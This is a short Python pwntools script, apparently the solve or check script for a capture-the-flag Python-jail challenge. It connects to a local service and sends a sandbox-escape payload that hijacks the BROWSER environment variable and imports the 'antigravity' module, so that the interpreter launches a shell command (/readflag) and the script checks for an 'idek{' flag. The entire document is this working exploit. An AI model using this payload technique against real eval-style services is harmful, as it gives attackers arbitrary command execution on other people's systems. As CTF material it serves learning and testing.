#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'

# server = process("./server.py")
server = remote("127.0.0.1", 1337)

server.sendlineafter(b'>>> ', b"__import__('antigravity',setattr(__import__('os'),'environ',dict(BROWSER='/bin/sh -c \"/readflag giveflag\" #%s')))")
if b'idek{' in server.recvline():
    exit(0)
exit(1)